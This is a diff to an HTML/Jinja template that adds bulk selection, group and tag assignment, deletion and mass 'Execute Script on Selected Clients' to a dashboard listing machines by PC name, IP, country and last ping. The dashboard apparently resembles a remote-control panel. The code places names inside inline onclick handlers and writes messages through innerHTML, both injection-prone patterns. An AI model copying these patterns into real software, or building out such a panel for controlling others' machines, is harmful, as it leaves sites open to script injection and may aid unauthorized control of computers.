@@ -1,5 +1,33 @@
 {% extends "base.html" %}
 
+{% block extra_css %}
+<style>
+    .user-row-clickable {
+        cursor: pointer;
+        transition: background-color 0.2s ease;
+    }
+    
+    .user-row-clickable:hover {
+        background-color: rgba(255, 255, 255, 0.05) !important;
+    }
+    
+    .user-row-clickable:active {
+        background-color: rgba(255, 255, 255, 0.1) !important;
+    }
+    
+    .user-checkbox {
+        pointer-events: auto;
+        cursor: pointer;
+    }
+    
+    /* Visual feedback for selected rows */
+    .user-row-clickable:has(.user-checkbox:checked) {
+        background-color: rgba(0, 123, 255, 0.1) !important;
+        border-left: 3px solid #007bff;
+    }
+</style>
+{% endblock %}
+
 {% block extra_js %}
 <script src="{{ url_for('static', filename='js/dashboard.js') }}"></script>
 <script>
@@ -56,6 +84,233 @@
             }, 3000);
         });
     }
+
+    // Bulk operations functionality
+    document.addEventListener('DOMContentLoaded', function() {
+        const selectAllCheckbox = document.getElementById('selectAll');
+        const userCheckboxes = document.querySelectorAll('.user-checkbox');
+        const bulkToolbar = document.getElementById('bulkToolbar');
+
+        // Handle select all checkbox
+        selectAllCheckbox.addEventListener('change', function() {
+            userCheckboxes.forEach(checkbox => {
+                checkbox.checked = this.checked;
+            });
+            updateBulkToolbar();
+        });
+
+        // Handle individual checkboxes
+        userCheckboxes.forEach(checkbox => {
+            checkbox.addEventListener('change', function() {
+                updateBulkToolbar();
+                updateSelectAllState();
+            });
+        });
+
+        function updateBulkToolbar() {
+            const selectedCount = document.querySelectorAll('.user-checkbox:checked').length;
+            if (selectedCount > 0) {
+                bulkToolbar.classList.remove('d-none');
+            } else {
+                bulkToolbar.classList.add('d-none');
+            }
+        }
+
+        function updateSelectAllState() {
+            const checkedBoxes = document.querySelectorAll('.user-checkbox:checked').length;
+            const totalBoxes = userCheckboxes.length;
+            
+            if (checkedBoxes === 0) {
+                selectAllCheckbox.indeterminate = false;
+                selectAllCheckbox.checked = false;
+            } else if (checkedBoxes === totalBoxes) {
+                selectAllCheckbox.indeterminate = false;
+                selectAllCheckbox.checked = true;
+            } else {
+                selectAllCheckbox.indeterminate = true;
+            }
+        }
+
+        // Load scripts for bulk execution
+        fetch('/script/api/global-scripts')
+            .then(response => response.json())
+            .then(data => {
+                const select = document.getElementById('bulkScriptSelect');
+                data.scripts.forEach(script => {
+                    const option = document.createElement('option');
+                    option.value = script.id;
+                    option.textContent = script.name;
+                    select.appendChild(option);
+                });
+            })
+            .catch(error => console.error('Error loading scripts:', error));
+
+        // Add click handlers for user rows
+        document.querySelectorAll('.user-row-clickable').forEach(row => {
+            row.addEventListener('click', function(e) {
+                // Don't trigger if clicking on checkbox column or actions column
+                if (e.target.closest('td').hasAttribute('onclick')) {
+                    return;
+                }
+                
+                const userId = this.getAttribute('data-user-id');
+                const checkbox = this.querySelector('.user-checkbox');
+                
+                if (checkbox) {
+                    checkbox.checked = !checkbox.checked;
+                    updateBulkToolbar();
+                    updateSelectAllState();
+                }
+            });
+        });
+    });
+
+    function getSelectedUserIds() {
+        return Array.from(document.querySelectorAll('.user-checkbox:checked')).map(cb => cb.value);
+    }
+
+    function bulkAssignGroup(groupId, groupName) {
+        const userIds = getSelectedUserIds();
+        if (userIds.length === 0) {
+            showAlert('No users selected', 'warning');
+            return;
+        }
+
+        if (confirm(`Assign ${userIds.length} users to group "${groupName}"?`)) {
+            const formData = new FormData();
+            formData.append('group_id', groupId);
+            userIds.forEach(id => formData.append('user_ids', id));
+
+            fetch('/bulk-assign-group', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.status === 'success') {
+                    showAlert(data.message, 'success');
+                    setTimeout(() => location.reload(), 1500);
+                } else {
+                    showAlert(data.message, 'danger');
+                }
+            })
+            .catch(error => showAlert('Error assigning group', 'danger'));
+        }
+    }
+
+    function bulkAssignTag(tagId, tagName) {
+        const userIds = getSelectedUserIds();
+        if (userIds.length === 0) {
+            showAlert('No users selected', 'warning');
+            return;
+        }
+
+        if (confirm(`Tag ${userIds.length} users with "${tagName}"?`)) {
+            const formData = new FormData();
+            formData.append('tag_id', tagId);
+            userIds.forEach(id => formData.append('user_ids', id));
+
+            fetch('/bulk-assign-tag', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.status === 'success') {
+                    showAlert(data.message, 'success');
+                    setTimeout(() => location.reload(), 1500);
+                } else {
+                    showAlert(data.message, 'danger');
+                }
+            })
+            .catch(error => showAlert('Error assigning tag', 'danger'));
+        }
+    }
+
+    function bulkDeleteUsers() {
+        const userIds = getSelectedUserIds();
+        if (userIds.length === 0) {
+            showAlert('No users selected', 'warning');
+            return;
+        }
+
+        if (confirm(`Are you sure you want to delete ${userIds.length} selected users? This action cannot be undone.`)) {
+            const formData = new FormData();
+            userIds.forEach(id => formData.append('user_ids', id));
+
+            fetch('/bulk-delete', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.status === 'success') {
+                    showAlert(data.message, 'success');
+                    setTimeout(() => location.reload(), 1500);
+                } else {
+                    showAlert(data.message, 'danger');
+                }
+            })
+            .catch(error => showAlert('Error deleting users', 'danger'));
+        }
+    }
+
+    function showBulkScriptModal() {
+        const userIds = getSelectedUserIds();
+        if (userIds.length === 0) {
+            showAlert('No users selected', 'warning');
+            return;
+        }
+
+        document.getElementById('selectedUsersCount').textContent = userIds.length;
+        new bootstrap.Modal(document.getElementById('bulkScriptModal')).show();
+    }
+
+    // Handle bulk script execution form
+    document.getElementById('bulkScriptForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const scriptId = document.getElementById('bulkScriptSelect').value;
+        const userIds = getSelectedUserIds();
+        
+        if (!scriptId || userIds.length === 0) {
+            showAlert('Please select a script and users', 'warning');
+            return;
+        }
+
+        const formData = new FormData();
+        formData.append('script_id', scriptId);
+        userIds.forEach(id => formData.append('user_ids', id));
+
+        fetch('/bulk-execute-script', {
+            method: 'POST',
+            body: formData
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.status === 'success') {
+                showAlert(data.message, 'success');
+                bootstrap.Modal.getInstance(document.getElementById('bulkScriptModal')).hide();
+            } else {
+                showAlert(data.message, 'danger');
+            }
+        })
+        .catch(error => showAlert('Error executing script', 'danger'));
+    });
+
+    function showAlert(message, type) {
+        const alertDiv = document.createElement('div');
+        alertDiv.className = `alert alert-${type} alert-dismissible fade show`;
+        alertDiv.innerHTML = `
+            <strong>${type === 'success' ? 'Success!' : type === 'warning' ? 'Warning!' : 'Error!'}</strong> ${message}
+            <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
+        `;
+        document.querySelector('.table-container').before(alertDiv);
+        
+        setTimeout(() => {
+            alertDiv.remove();
+        }, 5000);
+    }
 </script>
 {% endblock %}
 
@@ -72,17 +327,57 @@
             <div class="glass p-4 d-flex flex-column h-100">
                 <div class="d-flex justify-content-between align-items-center mb-4">
                     <h2 class="welcome-text">Users</h2>
-                    <form id="userSearchForm" class="d-flex search-container">
-                        <input type="text" id="userSearchInput" name="search" class="form-control form-control-sm search-input" placeholder="Search users..." value="{{ search_term or '' }}">
-                        <button type="submit" class="btn btn-sm search-btn">
-                            <i class="fas fa-search"></i> Search
-                        </button>
-                    </form>
+                    <div class="d-flex align-items-center">
+                        <form id="userSearchForm" class="d-flex search-container me-3">
+                            <input type="text" id="userSearchInput" name="search" class="form-control form-control-sm search-input" placeholder="Search users..." value="{{ search_term or '' }}">
+                            <button type="submit" class="btn btn-sm search-btn">
+                                <i class="fas fa-search"></i> Search
+                            </button>
+                        </form>
+                        <!-- Bulk Operations Toolbar -->
+                        <div id="bulkToolbar" class="d-none">
+                            <div class="btn-group" role="group">
+                                <button type="button" class="btn btn-sm btn-outline-info" data-bs-toggle="dropdown" aria-expanded="false">
+                                    <i class="fas fa-users"></i> Group Actions
+                                </button>
+                                <ul class="dropdown-menu dropdown-menu-dark">
+                                    {% for group in groups %}
+                                    <li><a class="dropdown-item" href="#" onclick="bulkAssignGroup({{ group.id }}, '{{ group.name }}')">
+                                        <span class="color-circle" style="background-color: {{ group.color }}; width: 12px; height: 12px; border-radius: 50%; display: inline-block; margin-right: 5px;"></span>
+                                        {{ group.name }}
+                                    </a></li>
+                                    {% endfor %}
+                                </ul>
+                            </div>
+                            <div class="btn-group" role="group">
+                                <button type="button" class="btn btn-sm btn-outline-secondary" data-bs-toggle="dropdown" aria-expanded="false">
+                                    <i class="fas fa-tag"></i> Tag Actions
+                                </button>
+                                <ul class="dropdown-menu dropdown-menu-dark">
+                                    {% for tag in tags %}
+                                    <li><a class="dropdown-item" href="#" onclick="bulkAssignTag({{ tag.id }}, '{{ tag.name }}')">
+                                        <span class="color-circle" style="background-color: {{ tag.color }}; width: 12px; height: 12px; border-radius: 50%; display: inline-block; margin-right: 5px;"></span>
+                                        {{ tag.name }}
+                                    </a></li>
+                                    {% endfor %}
+                                </ul>
+                            </div>
+                            <button type="button" class="btn btn-sm btn-outline-success" onclick="showBulkScriptModal()">
+                                <i class="fas fa-play"></i> Execute Script
+                            </button>
+                            <button type="button" class="btn btn-sm btn-outline-danger" onclick="bulkDeleteUsers()">
+                                <i class="fas fa-trash"></i> Delete Selected
+                            </button>
+                        </div>
+                    </div>
                 </div>
                 <div class="table-responsive flex-grow-1 table-container">
                     <table class="table table-borderless">
                         <thead>
                             <tr>
+                                <th>
+                                    <input type="checkbox" id="selectAll" class="form-check-input">
+                                </th>
                                 <th class="sortable" onclick="sortTable('id')">
                                     ID
                                     {% if current_sort == 'id' %}
@@ -115,6 +410,7 @@
                                         </span>
                                     {% endif %}
                                 </th>
+                                <th>Groups & Tags</th>
                                 <th class="sortable" onclick="sortTable('is_active')">
                                     Activity
                                     {% if current_sort == 'is_active' %}
@@ -131,25 +427,34 @@
                                         </span>
                                     {% endif %}
                                 </th>
-                                <th class="sortable" onclick="sortTable('first_ping')">
-                                    First Seen
-                                    {% if current_sort == 'first_ping' %}
-                                        <span class="sort-icon">
-                                            {% if current_order == 'asc' %}↑{% else %}↓{% endif %}
-                                        </span>
-                                    {% endif %}
-                                </th>
                                 <th>Actions</th>
                             </tr>
                         </thead>
                         <tbody>
                             {% for user in users %}
-                            <tr id="user-row-{{ user.id }}">
+                            <tr id="user-row-{{ user.id }}" class="user-row-clickable" data-user-id="{{ user.id }}">
+                                <td onclick="event.stopPropagation();">
+                                    <input type="checkbox" class="form-check-input user-checkbox" value="{{ user.id }}">
+                                </td>
                                 <td><span class="badge bg-dark">{{ user.id }}</span></td>
                                 <td><span class="text-secondary">{{ user.pcname }}</span></td>
                                 <td><span class="text-info">{{ user.ip_address }}</span></td>
                                 <td class="country-name">
                                     <span class="text-secondary">{{ user.country }}</span>
+                                </td>
+                                <td>
+                                    <div class="d-flex flex-wrap gap-1">
+                                        {% for group in user.groups %}
+                                        <span class="badge" style="background-color: {{ group.color }}; font-size: 0.7em;">
+                                            {{ group.name }}
+                                        </span>
+                                        {% endfor %}
+                                        {% for tag in user.tags %}
+                                        <span class="badge" style="background-color: {{ tag.color }}; font-size: 0.7em;">
+                                            #{{ tag.name }}
+                                        </span>
+                                        {% endfor %}
+                                    </div>
                                 </td>
                                 <td>
                                     <div class="d-flex align-items-center">
@@ -162,10 +467,7 @@
                                 <td title="{{ user.last_ping }}">
                                     <span class="text-warning">{{ user.last_ping_formatted }}</span>
                                 </td>
-                                <td title="{{ user.first_ping }}">
-                                    <span class="text-secondary">{{ user.first_ping_formatted }}</span>
-                                </td>
-                                <td>
+                                <td onclick="event.stopPropagation();">
                                     <a href="{{ url_for('script.user_scripts', user_id=user.id) }}" class="btn-action edit" title="Edit User Scripts">
                                         <i class="fas fa-edit"></i>
                                     </a>
@@ -188,4 +490,35 @@
 
 <!-- WebSocket Connection -->
 {% include 'components/websocket_connection.html' %}
+
+<!-- Bulk Script Execution Modal -->
+<div class="modal fade" id="bulkScriptModal" tabindex="-1">
+    <div class="modal-dialog">
+        <div class="modal-content bg-dark">
+            <div class="modal-header">
+                <h5 class="modal-title">Execute Script on Selected Clients</h5>
+                <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
+            </div>
+            <form id="bulkScriptForm">
+                <div class="modal-body">
+                    <div class="mb-3">
+                        <label for="bulkScriptSelect" class="form-label">Select Script</label>
+                        <select class="form-select bg-dark text-light" id="bulkScriptSelect" required>
+                            <option value="">Choose a script...</option>
+                            <!-- Scripts will be loaded via JavaScript -->
+                        </select>
+                    </div>
+                    <div class="alert alert-info">
+                        <i class="fas fa-info-circle"></i> 
+                        <span id="selectedUsersCount">0</span> users selected for script execution.
+                    </div>
+                </div>
+                <div class="modal-footer">
+                    <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Cancel</button>
+                    <button type="submit" class="btn btn-success">Execute Script</button>
+                </div>
+            </form>
+        </div>
+    </div>
+</div>
 {% endblock %}
